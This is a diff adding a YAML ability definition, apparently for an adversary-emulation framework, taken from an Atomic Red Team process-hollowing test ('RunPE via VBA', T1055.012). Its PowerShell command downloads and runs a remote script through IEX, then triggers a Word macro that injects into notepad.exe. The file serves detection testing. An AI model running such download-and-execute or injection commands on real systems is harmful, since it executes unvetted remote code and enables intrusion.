@@ -1,0 +1,21 @@
+- description: 'This module executes notepad.exe from within the WINWORD.EXE process
+
+    '
+  id: 557321fa-af98-c77b-2b45-2cecd7b1de37
+  name: RunPE via VBA
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing) ; Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"
+          -officeProduct "Word" -sub "Exploit"'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1055.012
+    name: 'Process Injection: Process Hollowing'
